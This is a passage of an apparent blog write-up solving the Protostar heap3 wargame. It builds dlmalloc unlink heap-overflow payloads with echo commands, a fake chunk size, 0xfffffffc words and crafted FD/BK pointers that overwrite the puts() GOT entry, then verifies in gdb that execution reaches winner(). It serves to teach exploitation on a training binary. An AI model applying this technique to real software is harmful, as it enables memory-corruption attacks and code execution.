+overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
+third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
+chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
+chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
+Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
+indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
+second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><span class="se">\x65</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we craft the third and final argument. The structure for it will be some padding + some four
+bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>
+
+<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
+overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
+trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
+by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
+this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
+dlmalloc into thinking the next chunk is free.</p>
+
+<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
+there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
+chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
+address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="cm">/* consolidate forward */</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define inuse_bit_at_offset(p, s) \</span>
+</span><span class='line'><span class="cp">  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
+we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
+it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
+thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
+any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>
+
+<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
+summing to a small number, at least in the way computers represent integers? In non-modular
+arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
+modular arithmetic, a small integer can be the sum of large numbers that are greater than the
+modulus.</p>
+
+<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
+So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
+dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
+fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
+ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
+integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
+<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
+simply use <code>0xfffffffc</code> again here.</p>
+
+<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
+we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><span class="se">\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>
+
+<h2>Checking it works</h2>
+
+<p>With the same gdb session as above, run the program with the three arguments.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
+</span><span class='line'><span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already</span><span class="p">.</span>
+</span><span class='line'><span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
+</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="n">Error</span> <span class="k">while</span> <span class="n">running</span> <span class="nl">hook_stop</span><span class="p">:</span>
+</span><span class='line'><span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x804c000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
+</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="p">...</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
+</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Examine the GOT entry for <code>puts()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
+</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048796</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c030</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
+</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
+</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x0804c014</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let the rest of the program run to see <code>winner()</code> is called.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x08048790</span> <span class="n">in</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x0804c014</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x0804c019</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="n">winner</span> <span class="p">()</span> <span class="n">at</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">8</span>
+</span><span class='line'><span class="mi">8</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
+</span><span class='line'>  <span class="n">in</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="n">c</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1587442625</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
